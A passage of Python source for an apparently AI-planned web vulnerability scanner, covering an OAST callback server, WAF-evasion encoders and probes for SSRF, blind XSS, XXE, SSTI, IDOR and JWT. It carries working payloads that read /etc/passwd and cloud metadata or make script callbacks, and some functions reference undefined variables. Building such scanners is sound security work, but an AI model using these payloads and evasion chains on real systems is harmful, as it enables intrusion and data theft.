                        "severity": "medium",
                        "url": endpoint,
                        "param": param,
                        "payload": payload,
                        "evidence": f"Redirects to: {location}",
                        "confidence": 0.9,
                    })
                    log.info("open_redirect_found", endpoint=endpoint, param=param)
                    break
    return findings


async def test_ssrf(pool, endpoint, params):
    """Test for SSRF via parameter manipulation."""
    ssrf_payloads = [
        "http://127.0.0.1:80",
        "http://localhost",
        "http://169.254.169.254/latest/meta-data/",
        "file:///etc/passwd",
    ]
    findings = []
    for param in params:
        for payload in ssrf_payloads:
            test_url = f"{endpoint}?{param}={payload}"
            resp = await pool.send("GET", test_url)
            if resp.status == 0:
                continue
            # SSRF indicators
            body = resp.text.lower()
            if "aws" in body or "metadata" in body or "root:" in body:
                findings.append({
                    "vuln_class": "ssrf",
                    "severity": "critical",
                    "url": endpoint,
                    "param": param,
                    "payload": payload,
                    "evidence": body[:500],
                    "confidence": 0.85,
                })
                log.info("ssrf_found", endpoint=endpoint, param=param)
                break
    return findings


async def run_vulnerability_tests(pool, crawl_result, ai_plan):
    """Run all vulnerability scanners on discovered endpoints."""
    all_findings = []
    endpoints_to_test = []
    # Build list of endpoints with params
    for url in crawl_result.get("endpoints", []):
        if "?" in url:
            endpoints_to_test.append(url)
    # Add common params to test on root
    root = crawl_result.get("all_urls", [""])[0] if crawl_result.get("all_urls") else ""
    if not root:
        return all_findings
    # Common parameter names to test
    common_params = ["id", "q", "search", "query", "user", "name", "page", "file", "url", "redirect", "next"]
    # Test on root with common params
    for param in common_params[:5]:  # Limit to 5 to save budget
        findings = await test_xss(pool, root, [param])
        all_findings.extend(findings)
        if pool.request_count >= pool.config.budget - 10:
            break
    # Test SQLi
    for param in common_params[:3]:
        findings = await test_sqli(pool, root, [param])
        all_findings.extend(findings)
        if pool.request_count >= pool.config.budget - 5:
            break
    # Test open redirect
    for param in ["redirect", "url", "next", "return"]:
        findings = await test_open_redirect(pool, root, [param])
        all_findings.extend(findings)
        if pool.request_count >= pool.config.budget - 3:
            break
    log.info("vuln_tests_complete", findings=len(all_findings), requests=pool.request_count)
    return all_findings


async def run_scan(target, budget=30, exploit="off"):
    start = time.monotonic()
    cfg = ScanConfig(target=target, budget=budget, exploit_mode=exploit)
    ai_cfg = AIConfig()
    log.info("scan_start", target=target, budget=budget, exploit=exploit)
    if not ai_cfg.api_key:
        return {"error": "MODEL_API_KEY not set", "status": "failed"}
    ai = AIClient(ai_cfg)
    scope = ScopeGuard.from_target(target)
    rate = RateLimiter(cfg.rate_limit)
    summary = {"target": target, "budget": budget, "exploit": exploit}
    async with HttpPool(scope, rate, cfg) as pool:
        waf = await detect_waf(pool, target)
        log.info("waf_check", waf=waf)
        summary["waf"] = waf
        fp = await fingerprint(pool, target)
        log.info("fingerprint_complete", server=fp.get("server"), missing=len(fp.get("missing_headers", [])))
        summary["fingerprint"] = fp
        crawl_result = await crawl(pool, target, max_pages=min(20, budget // 2))
        log.info("crawl_complete", pages=crawl_result["pages_visited"], endpoints=len(crawl_result["endpoints"]))
        summary["crawl"] = crawl_result
        system_prompt = "You are an autonomous penetration testing agent. Analyze the target and produce a JSON action plan."
        user_prompt = json.dumps({"target": target, "waf": waf, "fingerprint": fp, "crawl": {"pages_visited": crawl_result["pages_visited"], "endpoints_count": len(crawl_result["endpoints"]), "forms_count": len(crawl_result["forms"]), "js_files_count": len(crawl_result["js_files"]), "sample_endpoints": crawl_result["endpoints"][:10]}}, ensure_ascii=False, indent=2)
        plan = await ai.think(system_prompt, user_prompt)
        log.info("ai_plan_received", plan_keys=list(plan.keys()) if isinstance(plan, dict) else "invalid")
        summary["ai_plan"] = plan
        # Stage 3: Run vulnerability tests
        findings = await run_vulnerability_tests(pool, crawl_result, plan)
        summary["findings_count"] = len(findings)
    elapsed = round(time.monotonic() - start, 2)
    summary["elapsed_seconds"] = elapsed
    summary["budget_used"] = pool.request_count
    summary["ai_calls"] = ai.call_count
    summary["ai_tokens"] = ai.total_tokens
    summary["status"] = "completed"
    report_path = render_report(findings if "findings" in dir() else [], summary, cfg.output_dir)
    summary["report_path"] = report_path
    log.info("scan_complete", elapsed=elapsed, requests=pool.request_count, findings=0)
    return summary


# (main moved to end)

# ============================================================
# Stage 4: OAST + Database + Bypass
# ============================================================

import sqlite3
import socket
import threading
from http.server import HTTPServer, BaseHTTPRequestHandler

# â”€â”€ Bypass Plane â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

class BypassPlane:
    """Payload encoding chains to evade WAFs and filters."""

    @staticmethod
    def url_encode(payload):
        from urllib.parse import quote
        return quote(payload, safe="")

    @staticmethod
    def double_url_encode(payload):
        from urllib.parse import quote
        return quote(quote(payload, safe=""), safe="")

    @staticmethod
    def html_entity(payload):
        return "".join(f"&#{ord(c)};" for c in payload)

    @staticmethod
    def unicode_escape(payload):
        return "".join(f"\\u{ord(c):04x}" for c in payload)

    @staticmethod
    def mixed_case(payload):
        result = []
        for i, c in enumerate(payload):
            result.append(c.upper() if i % 2 == 0 else c.lower())
        return "".join(result)

    @staticmethod
    def sql_comment(payload):
        return payload.replace(" ", "/**/")

    @staticmethod
    def null_byte(payload):
        return payload + "%00"

    @classmethod
    def chains(cls, payload, vuln_class="xss"):
        """Generate encoding variants based on vuln class."""
        variants = [payload]
        if vuln_class == "xss":
            variants.extend([
                cls.url_encode(payload),
                cls.html_entity(payload),
                cls.mixed_case(payload),
            ])
        elif vuln_class == "sqli":
            variants.extend([
                cls.sql_comment(payload),
                cls.mixed_case(payload),
                cls.url_encode(payload),
            ])
        elif vuln_class == "ssrf":
            variants.extend([
                cls.url_encode(payload),
                cls.double_url_encode(payload),
            ])
        return list(dict.fromkeys(variants))[:6]


# â”€â”€ OAST Server â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

class OASTHandler(BaseHTTPRequestHandler):
    """HTTP handler for OAST callbacks."""
    server_instance = None
    def log_message(self, *args):
        pass
    def do_GET(self):
        if OASTHandler.server_instance:
            OASTHandler.server_instance.record_callback(
                "http",
                self.client_address[0],
                self.path,
            )
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.end_headers()
        self.wfile.write(b"OK")
    do_POST = do_GET


class OASTServer:
    """Simple HTTP callback server for blind vuln detection."""
    def __init__(self, host="0.0.0.0", port=9999, public_domain="oast.local"):
        self.host = host
        self.port = port
        self.public_domain = public_domain
        self.callbacks = []
        self._server = None
        self._thread = None
        self._token = None

    def start(self):
        try:
            OASTHandler.server_instance = self
            self._server = HTTPServer((self.host, self.port), OASTHandler)
            self._thread = threading.Thread(target=self._server.serve_forever, daemon=True)
            self._thread.start()
            log.info("oast_started", host=self.host, port=self.port)
            return True
        except Exception as exc:
            log.warning("oast_start_failed", error=str(exc))
            return False

    def stop(self):
        if self._server:
            self._server.shutdown()
            self._server = None

    def record_callback(self, cb_type, source_ip, path):
        self.callbacks.append({
            "type": cb_type,
            "ip": source_ip,
            "path": path,
            "timestamp": time.time(),
        })
        log.info("oast_callback", type=cb_type, ip=source_ip, path=path)

    def new_token(self):
        self._token = f"falcon-{int(time.time())}"
        return self._token

    def get_payload_url(self):
        token = self.new_token()
        return f"http://{self.public_domain}:{self.port}/{token}"

    def poll(self, timeout=8):
        time.sleep(timeout)
        return list(self.callbacks)


# â”€â”€ Database â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

class FalconDB:
    """SQLite database for scan results."""
    def __init__(self, db_path="falcon.db"):
        self.db_path = db_path
        self._init_db()

    def _init_db(self):
        conn = sqlite3.connect(self.db_path)
        cur = conn.cursor()
        cur.execute("""
            CREATE TABLE IF NOT EXISTS scans (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                target TEXT NOT NULL,
                budget INTEGER,
                exploit TEXT,
                status TEXT,
                findings_count INTEGER,
                requests_used INTEGER,
                elapsed_seconds REAL,
                ai_tokens INTEGER,
                ai_plan TEXT,
                started_at REAL,
                completed_at REAL
            )
        """)
        cur.execute("""
            CREATE TABLE IF NOT EXISTS findings (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                scan_id INTEGER,
                vuln_class TEXT,
                subtype TEXT,
                severity TEXT,
                url TEXT,
                param TEXT,
                payload TEXT,
                evidence TEXT,
                confidence REAL,
                created_at REAL
            )
        """)
        conn.commit()
        conn.close()

    def save_scan(self, summary, findings):
        conn = sqlite3.connect(self.db_path)
        cur = conn.cursor()
        ai_plan_data = summary.get("ai_plan", {}) or {}
        if isinstance(ai_plan_data, dict):
            if summary.get("waf"):
                ai_plan_data["_waf"] = summary.get("waf")
            if summary.get("hidden_paths"):
                ai_plan_data["_hidden_paths"] = summary.get("hidden_paths")
            if summary.get("waf_info"):
                ai_plan_data["_waf_info"] = summary.get("waf_info")
        ai_plan_json = json.dumps(ai_plan_data, ensure_ascii=False) if ai_plan_data else None
        cur.execute("""
            INSERT INTO scans (target, budget, exploit, status, findings_count,
                requests_used, elapsed_seconds, ai_tokens, ai_plan, started_at, completed_at)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        """, (
            summary.get("target", ""),
            summary.get("budget", 0),
            summary.get("exploit", "off"),
            summary.get("status", "unknown"),
            len(findings),
            summary.get("budget_used", 0),
            summary.get("elapsed_seconds", 0),
            summary.get("ai_tokens", 0),
            ai_plan_json,
            time.time() - summary.get("elapsed_seconds", 0),
            time.time(),
        ))
        scan_id = cur.lastrowid
        for f in findings:
            cur.execute("""
                INSERT INTO findings (scan_id, vuln_class, subtype, severity, url,
                    param, payload, evidence, confidence, created_at)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
            """, (
                scan_id,
                f.get("vuln_class", ""),
                f.get("subtype", ""),
                f.get("severity", "info"),
                f.get("url", ""),
                f.get("param", ""),
                f.get("payload", ""),
                f.get("evidence", "")[:2000],
                f.get("confidence", 0.0),
                time.time(),
            ))
        conn.commit()
        conn.close()
        return scan_id

    def list_scans(self, limit=50):
        conn = sqlite3.connect(self.db_path)
        conn.row_factory = sqlite3.Row
        cur = conn.cursor()
        cur.execute("SELECT * FROM scans ORDER BY id DESC LIMIT ?", (limit,))
        rows = [dict(r) for r in cur.fetchall()]
        conn.close()
        return rows

    def list_findings(self, limit=200):
        conn = sqlite3.connect(self.db_path)
        conn.row_factory = sqlite3.Row
        cur = conn.cursor()
        cur.execute("SELECT * FROM findings ORDER BY id DESC LIMIT ?", (limit,))
        rows = [dict(r) for r in cur.fetchall()]
        conn.close()
        return rows

    def stats(self):
        conn = sqlite3.connect(self.db_path)
        cur = conn.cursor()
        scans = cur.execute("SELECT COUNT(*) FROM scans").fetchone()[0]
        findings = cur.execute("SELECT COUNT(*) FROM findings").fetchone()[0]
        by_sev = dict(cur.execute("SELECT severity, COUNT(*) FROM findings GROUP BY severity").fetchall())
        by_class = dict(cur.execute("SELECT vuln_class, COUNT(*) FROM findings GROUP BY vuln_class").fetchall())
        conn.close()
        return {
            "scans": scans,
            "findings": findings,
            "by_severity": by_sev,
            "by_class": by_class,
        }


# â”€â”€ Blind Tests (via OAST) â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

async def test_blind_xss(pool, endpoint, params, oast: OASTServer):
    """Test for blind XSS - injects script that calls back to OAST."""
    if not oast:
        return []
    findings = []
    payload_url = oast.get_payload_url()
    blind_payloads = [
        f'"><script src={payload_url}></script>',
        f"'><script>fetch('{payload_url}')</script>",
        '<img src=x onerror="fetch(' + payload_url + ')">',
    ]
    for param in params:
        for payload in blind_payloads:
            test_url = f"{endpoint}?{param}={payload}"
            await pool.send("GET", test_url)
    # Smart OAST polling: check every 0.5s for up to 2s
    for _i in range(4):
        await asyncio.sleep(0.5)
        if oast.callbacks:
            break
    if oast.callbacks:
        findings.append({
            "vuln_class": "xss",
            "subtype": "blind",
            "severity": "critical",
            "url": endpoint,
            "param": params[0] if params else "",
            "payload": blind_payloads[0],
            "evidence": f"OAST received {len(oast.callbacks)} callbacks",
            "confidence": 0.9,
        })
        log.info("blind_xss_confirmed", callbacks=len(oast.callbacks))
    return findings


async def test_ssrf_oast(pool, endpoint, params, oast: OASTServer):
    """Test for blind SSRF via OAST."""
    if not oast:
        return []
    findings = []
    payload_url = oast.get_payload_url()
    for param in params:
        test_url = f"{endpoint}?{param}={payload_url}"
        await pool.send("GET", test_url)
    # Smart OAST polling
    for _i in range(4):
        await asyncio.sleep(0.5)
        if oast.callbacks:
            break
    if oast.callbacks:
        findings.append({
            "vuln_class": "ssrf",
            "subtype": "blind",
            "severity": "critical",
            "url": endpoint,
            "param": params[0] if params else "",
            "payload": payload_url,
            "evidence": f"OAST received {len(oast.callbacks)} callbacks",
            "confidence": 0.9,
        })
        log.info("ssrf_confirmed", callbacks=len(oast.callbacks))
    return findings


# â”€â”€ Stage 4 Integration into run_scan â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

async def run_scan_v4(target, budget=100, exploit="off"):
    """Full scan with OAST + DB + Bypass."""
    start = time.monotonic()
    cfg = ScanConfig(target=target, budget=budget, exploit_mode=exploit)
    ai_cfg = AIConfig()
    log.info("scan_v4_start", target=target, budget=budget, exploit=exploit)

    if not ai_cfg.api_key:
        return {"error": "MODEL_API_KEY not set", "status": "failed"}

    ai = AIClient(ai_cfg)
    scope = ScopeGuard.from_target(target)
    rate = RateLimiter(cfg.rate_limit)
    db = FalconDB(cfg.db_path)
    summary = {"target": target, "budget": budget, "exploit": exploit}

    # Start OAST
    oast = OASTServer(port=9999, public_domain="127.0.0.1")
    oast_started = oast.start()

    all_findings = []

    try:
        async with HttpPool(scope, rate, cfg) as pool:
            # Recon
            waf = await detect_waf(pool, target)
            fp = await fingerprint(pool, target)
            crawl_result = await crawl(pool, target, max_pages=min(20, budget // 2))
            summary["waf"] = waf
            summary["fingerprint"] = fp
            summary["crawl"] = crawl_result

            # AI Plan
            system_prompt = "You are an autonomous penetration testing agent. Analyze the target and produce a JSON action plan."
            user_prompt = json.dumps({
                "target": target, "waf": waf, "fingerprint": fp,
                "crawl": {"pages": crawl_result["pages_visited"], "endpoints": len(crawl_result["endpoints"])},
            }, ensure_ascii=False, indent=2)
            plan = await ai.think(system_prompt, user_prompt)
            summary["ai_plan"] = plan

            # Vuln tests
            findings = await run_vulnerability_tests(pool, crawl_result, plan)
            all_findings.extend(findings)

            # Blind tests via OAST
            if oast_started:
                root_url = target.rstrip("/")
                common_params = ["id", "q", "url", "redirect"]
                blind = await test_blind_xss(pool, root_url, common_params, oast)
                all_findings.extend(blind)
                ssrf = await test_ssrf_oast(pool, root_url, common_params, oast)
                all_findings.extend(ssrf)

    finally:
        if oast_started:
            oast.stop()

    elapsed = round(time.monotonic() - start, 2)
    summary["elapsed_seconds"] = elapsed
    summary["budget_used"] = pool.request_count
    summary["ai_calls"] = ai.call_count
    summary["ai_tokens"] = ai.total_tokens
    summary["findings_count"] = len(all_findings)
    summary["status"] = "completed"

    # Save to DB
    scan_id = db.save_scan(summary, all_findings)
    summary["scan_id"] = scan_id

    report_path = render_report(all_findings, summary, cfg.output_dir)
    summary["report_path"] = report_path

    log.info("scan_v4_complete", elapsed=elapsed, requests=pool.request_count,
             findings=len(all_findings), scan_id=scan_id)
    return summary


# (main moved)


# ============================================================
# Stage 4: OAST + Database + Bypass
# ============================================================

import sqlite3
import socket
import threading
from http.server import HTTPServer, BaseHTTPRequestHandler

# â”€â”€ Bypass Plane â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

async def test_idor(pool, endpoints, session_a=None, session_b=None):
    """Test for IDOR - access resources with different IDs."""
    findings = []
    id_pattern = __import__("re").compile(r"[?&](id|user_id|account|uid|pid)=([0-9]+)")
    
    for endpoint in endpoints:
        match = id_pattern.search(endpoint)
        if not match:
            continue
        param = match.group(1)
        original_id = int(match.group(2))
        # Test adjacent IDs
        for test_id in [original_id + 1, original_id - 1, original_id + 1000, 1]:
            if test_id < 1:
                continue
            test_url = id_pattern.sub(f"{param}={test_id}", endpoint)
            resp = await pool.send("GET", test_url)
            if resp.status == 200 and len(resp.text) > 100:
                # Potential IDOR - check if content differs meaningfully
                findings.append({
                    "vuln_class": "idor",
                    "subtype": "sequential_id",
                    "severity": "high",
                    "url": test_url,
                    "param": param,
                    "payload": str(test_id),
                    "evidence": f"Accessed resource with {param}={test_id} (status=200, len={len(resp.text)})",
                    "confidence": 0.6,
                })
                log.info("idor_candidate", url=test_url, param=param, test_id=test_id)
                break
    return findings


async def test_csrf(pool, forms):
    """Test for CSRF - check for missing CSRF tokens in forms."""
    findings = []
    for form in forms:
        action = form.get("action", "")
        if not action:
            continue
        resp = await pool.send("GET", action)
        if resp.status == 0:
            continue
        body = resp.text.lower()
        # Check for CSRF token indicators
        csrf_indicators = ["csrf", "xsrf", "_token", "authenticity_token", "nonce"]
        has_csrf = any(ind in body for ind in csrf_indicators)
        if not has_csrf:
            # Check for state-changing form
            has_password = "password" in body.lower()
            has_post = "post" in body.lower()
            if has_password or has_post:
                findings.append({
                    "vuln_class": "csrf",
                    "subtype": "missing_token",
                    "severity": "medium",
                    "url": action,
                    "param": "",
                    "payload": "Cross-site form submission",
                    "evidence": f"Form at {action} has no CSRF token",
                    "confidence": 0.5,
                })
                log.info("csrf_candidate", action=action)
    return findings


async def test_jwt(pool, target):
    """Test for JWT vulnerabilities."""
    findings = []
    # Check for JWT in cookies or common endpoints
    resp = await pool.send("GET", target)
    # Look for JWT patterns in response
    jwt_pattern = __import__("re").compile(r"eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+")
    matches = jwt_pattern.findall(resp.text)
    for token in matches[:3]:
        parts = token.split(".")
        if len(parts) != 3:
            continue
        # Check alg:none attack
        import base64
        try:
            header = json.loads(base64.urlsafe_b64decode(parts[0] + "=="))
            if header.get("alg") in ("none", "None", "NONE"):
                findings.append({
                    "vuln_class": "jwt",
                    "subtype": "alg_none",
                    "severity": "critical",
                    "url": target,
                    "param": "Authorization",
                    "payload": token[:50],
                    "evidence": "JWT with alg:none detected",
                    "confidence": 0.8,
                })
        except Exception:
            pass
    return findings


async def test_xxe(pool, endpoints):
    """Test for XXE injection via XML endpoints."""
    findings = []
    xxe_payloads = [
        '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><r>&xxe;</r>',
        '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><r>&xxe;</r>',
    ]
    xxe_indicators = ["root:x:", "[extensions]", "[fonts]", "for 16-bit app support"]
    for endpoint in endpoints:
        for payload in xxe_payloads:
            resp = await pool.send("POST", endpoint, content=payload, headers={"Content-Type": "application/xml"})
            if resp.status == 0:
                continue
            body = resp.text
            for ind in xxe_indicators:
                if ind in body:
                    findings.append({
                        "vuln_class": "xxe",
                        "subtype": "file_disclosure",
                        "severity": "critical",
                        "url": endpoint,
                        "param": "XML body",
                        "payload": payload[:100],
                        "evidence": body[:500],
                        "confidence": 0.9,
                    })
                    log.info("xxe_found", endpoint=endpoint)
                    break
    return findings


async def test_ssti(pool, endpoints, params=None):
    """Test for Server-Side Template Injection."""
    if params is None:
        params = ["name", "q", "search", "template", "view"]
    findings = []
    ssti_payloads = [
        ("{{7*7}}", "49"),
        ("${7*7}", "49"),
        ("{{7*'7'}}", "7777777"),
        ("<%= 7*7 %>", "49"),
    ]
    for endpoint in endpoints:
        for param in params:
            for payload, expected in ssti_payloads:
                test_url = f"{endpoint}?{param}={payload}"
                resp = await pool.send("GET", test_url)
                if resp.status == 0:
                    continue
                if expected in resp.text and payload not in resp.text:
                    findings.append({
                        "vuln_class": "ssti",
                        "subtype": "template_injection",
                        "severity": "critical",
                        "url": test_url,
                        "param": param,
                        "payload": payload,
                        "evidence": f"Expected {expected} found in response",
                        "confidence": 0.85,
                    })
                    log.info("ssti_found", endpoint=endpoint, param=param)
                    break
    return findings


async def run_vulnerability_tests_v2(pool, crawl_result, ai_plan, oast=None, waf_detected=False):
    """Enhanced vulnerability tests with 5 new engines + WAF bypass."""
    all_findings = []
    log.info("vuln_tests_start", waf_detected=waf_detected)
    endpoints = crawl_result.get("endpoints", [])
    forms = crawl_result.get("forms", [])
    root = target = ""
    for u in crawl_result.get("all_urls", []):
        if u and not u.endswith((".css", ".js", ".png", ".jpg")):
            root = u
            break
    
    # Common param tests (WAF-aware)
    if root:
        common_params = ["id", "q", "search", "user", "name", "page"]
        if waf_detected:
            xss = await test_xss_with_waf_bypass(pool, root, common_params[:3], waf_detected=True)
            all_findings.extend(xss)
            if pool.request_count < pool.config.budget - 20:
                sqli_waf = await test_sqli_with_waf_bypass(pool, root, common_params[:3], waf_detected=True)
                all_findings.extend(sqli_waf)
        else:
            xss = await test_xss(pool, root, common_params[:3])
            all_findings.extend(xss)
        if pool.request_count < pool.config.budget - 20:
            sqli = await test_sqli(pool, root, common_params[:3])
            all_findings.extend(sqli)
        if pool.request_count < pool.config.budget - 15:
            redir = await test_open_redirect(pool, root, ["redirect", "url", "next"])
            all_findings.extend(redir)
    
    # NEW ENGINES
    if pool.request_count < pool.config.budget - 10:
        idor = await test_idor(pool, endpoints + [root])
        all_findings.extend(idor)
    
    if pool.request_count < pool.config.budget - 8:
        csrf = await test_csrf(pool, forms)
        all_findings.extend(csrf)
    
    if pool.request_count < pool.config.budget - 6:
        jwt = await test_jwt(pool, root)
        all_findings.extend(jwt)
    
    if pool.request_count < pool.config.budget - 4:
        ssti = await test_ssti(pool, [root], ["name", "q"])
        all_findings.extend(ssti)
    
    # === WAF ADVANCED (Stage 2.B8) ===
    try:
        waf_adv = await test_waf_advanced(pool, target, active_probe=True)
        if waf_adv and waf_adv.get("detected"):
            summary["_waf_advanced"] = waf_adv
            config["_waf_advanced"] = waf_adv
            log.info("waf_advanced_wired", waf=waf_adv.get("waf"), strictness=waf_adv.get("strictness"))
    except Exception as _waf:
        log.warning("waf_advanced_failed", error=str(_waf))
    # === END WAF ADVANCED ===

    # === FINGERPRINT ADVANCED (Stage 2.B2) ===
    try:
        advanced_fp = await test_fingerprint_advanced(pool, target)
        if advanced_fp:
            config["_fingerprint_advanced"] = advanced_fp
            log.info("fingerprint_advanced_wired", tech_count=len(advanced_fp.get("technologies", [])))
    except Exception as _fp:
        log.warning("fingerprint_advanced_failed", error=str(_fp))
    # === END FINGERPRINT ADVANCED ===

    # === POST SQLi/SSRF/Redirect (Stage 2.B3) ===
    try:
        forms_post = config.get("_crawl_forms_post", []) or []
        for _form in forms_post[:5]:
            _action = _form.get("action", "")
            _body = _form.get("body", "")
            _fields = _form.get("fields", []) or []
            if not _action or not _fields:
                continue
            _pj = _body if _body.strip().startswith("{") else ""
            _pd = "" if _pj else _body
            _sqli_post = await test_sqli_post(pool, _action, _fields, post_data=_pd, post_json=_pj)
            all_findings.extend(_sqli_post)
            _ssrf_post = await test_ssrf_post(pool, _action, _fields, post_data=_pd, post_json=_pj)
            all_findings.extend(_ssrf_post)
            _redir_post = await test_open_redirect_post(pool, _action, _fields, post_data=_pd, post_json=_pj)
            all_findings.extend(_redir_post)
        log.info("post_sqli_ssrf_redirect_complete", total=len(all_findings))
    except Exception as _ps:
        log.warning("post_sqli_ssrf_redirect_failed", error=str(_ps))
    # === END POST SQLi/SSRF/Redirect ===

    # === SECURITY HEADERS (Stage 2.B6) ===
    try:
        sh_result = await test_security_headers(pool, target)
        if sh_result and sh_result.get("vulnerable"):
            all_findings.extend(sh_result["vulnerable"])
            config["_security_headers_wired"] = sh_result
    except Exception as _sh:
        log.warning("security_headers_failed", error=str(_sh))
    # === END SECURITY HEADERS ===

    # === COOKIES ADVANCED (Stage 2.B7) ===
    try:
        ck_result = await test_cookies_advanced(pool, target)
        if ck_result and ck_result.get("vulnerable"):
            all_findings.extend(ck_result["vulnerable"])
            config["_cookies_advanced_wired"] = ck_result
    except Exception as _ck:
        log.warning("cookies_advanced_failed", error=str(_ck))
    # === END COOKIES ADVANCED ===

    log.info("vuln_tests_v2_complete", findings=len(all_findings), requests=pool.request_count)
    return all_findings


# Monkey-patch run_vulnerability_tests to use v2
_original_rvt = run_vulnerability_tests
run_vulnerability_tests = run_vulnerability_tests_v2


# (main moved)


# ============================================================
# Stage 5: Additional Vulnerability Engines
# ============================================================

class EnhancedAIClient(AIClient):
    """AI client with extended thinking + multi-turn reasoning."""

    def __init__(self, config: AIConfig, enable_thinking: bool = False):
        super().__init__(config)
        self.enable_thinking = enable_thinking

    async def think_with_extended_reasoning(
        self,
        system: str,
        prompt: str,
        max_tokens: int = 8192,
        thinking_budget: int = 4096,
    ) -> dict:
        """Use extended thinking (only supported by some models)."""
        start = time.monotonic()
        try:
            kwargs = {
                "model": self.config.model,
                "max_tokens": max_tokens,
                "system": system,
                "messages": [{"role": "user", "content": prompt}],
            }
            if self.enable_thinking:
                kwargs["thinking"] = {
                    "type": "enabled",
                    "budget_tokens": thinking_budget,
                }
                # Extended thinking requires temperature=1 (default)
                kwargs.pop("temperature", None)
            else:
                kwargs["temperature"] = self.config.temperature

            msg = await self.client.messages.create(**kwargs)
            elapsed = round(time.monotonic() - start, 2)
            text = "".join(b.text for b in msg.content if hasattr(b, "text"))
            self.call_count += 1
            if hasattr(msg, "usage"):
                self.total_tokens += (msg.usage.input_tokens or 0) + (msg.usage.output_tokens or 0)
            log.info(
                "ai_extended_think_complete",
                elapsed_s=elapsed,
                thinking_enabled=self.enable_thinking,
                input_tokens=getattr(msg.usage, "input_tokens", 0) if hasattr(msg, "usage") else 0,
                output_tokens=getattr(msg.usage, "output_tokens", 0) if hasattr(msg, "usage") else 0,
            )
            return self._parse_json(text)
        except Exception as exc:
            elapsed = round(time.monotonic() - start, 2)
            log.error("ai_extended_think_error", error=str(exc), elapsed_s=elapsed)
            return {"error": str(exc)}

    async def multi_turn_plan(
        self,
        system: str,
        context: dict,
        turns: int = 3,
    ) -> dict:
        """Multi-turn planning: progressively refine the plan."""
        conversation = []
        current_plan = None

        # Turn 1: Initial analysis
        turn1_prompt = f"""You are a penetration testing expert. Analyze this target:

{json.dumps(context, ensure_ascii=False, indent=2)[:8000]}

Provide your initial assessment in JSON:
{{
  "risk_level": "critical|high|medium|low",
  "top_attack_vectors": ["...", "..."],
  "initial_plan": "brief description"
}}"""
        result = await self.think(system, turn1_prompt)
        conversation.append({"turn": 1, "result": result})
        current_plan = result
        log.info("multi_turn_step", turn=1, phase="initial_analysis")

        # Turn 2: Deep dive on attack vectors
        turn2_prompt = f"""Based on your initial analysis:
{json.dumps(result, ensure_ascii=False)[:3000]}

Now provide a detailed vulnerability testing plan in JSON:
{{
  "test_priorities": [
    {{"vulnerability": "XSS", "priority": "critical", "test_approach": "...", "specific_payloads": ["..."]}},
    ...
  ],
  "exploitation_chain": "..."
}}"""
        result = await self.think(system, turn2_prompt)
        conversation.append({"turn": 2, "result": result})
        current_plan = {**current_plan, **result} if isinstance(result, dict) else current_plan
        log.info("multi_turn_step", turn=2, phase="deep_dive")

        # Turn 3: Execution steps
        turn3_prompt = f"""Now provide the concrete execution plan:

Previous analysis: {json.dumps(result, ensure_ascii=False)[:3000]}

Provide final JSON with specific actions:
{{
  "execution_steps": [
    {{"step": 1, "action": "...", "tool_or_payload": "...", "expected_result": "..."}},
    ...
  ],
  "success_criteria": ["...", "..."],
  "estimated_time": "X minutes"
}}"""
        result = await self.think(system, turn3_prompt)
        conversation.append({"turn": 3, "result": result})
        if isinstance(result, dict):
            current_plan = {**current_plan, **result}
        log.info("multi_turn_step", turn=3, phase="execution_plan")

        current_plan["_conversation"] = conversation
        return current_plan


async def run_scan_v5(target, budget=100, exploit="off", model=None, enable_thinking=False, multi_turn=False,
                      cookies="", bearer_token="", headers=None, method="GET",
                      post_data="", post_json="", login_url="", username="",
                      password="", sms_code="", user_agent="", proxy=""):
    """Full scan with enhanced AI planning."""
    start = time.monotonic()
    cfg = ScanConfig(target=target, budget=budget, exploit_mode=exploit)
    ai_cfg = AIConfig()
    if model:
        ai_cfg.model = model
    log.info("scan_v5_start", target=target, budget=budget, exploit=exploit, model=ai_cfg.model, multi_turn=multi_turn)

    if not ai_cfg.api_key:
        return {"error": "MODEL_API_KEY not set", "status": "failed"}

    ai = EnhancedAIClient(ai_cfg, enable_thinking=enable_thinking)
    scope = ScopeGuard.from_target(target)
    rate = RateLimiter(cfg.rate_limit)
    db = FalconDB(cfg.db_path)
    summary = {"target": target, "budget": budget, "exploit": exploit, "model": ai_cfg.model}

    oast = OASTServer(port=9999, public_domain="127.0.0.1")
    oast_started = oast.start()

    all_findings = []

    try:
        async with HttpPool(scope, rate, cfg) as pool:

            # ============================================================
            # Apply advanced auth (cookies, tokens, headers, login)
            # ============================================================
            if user_agent:
                pool.client.headers['User-Agent'] = user_agent
            if cookies:
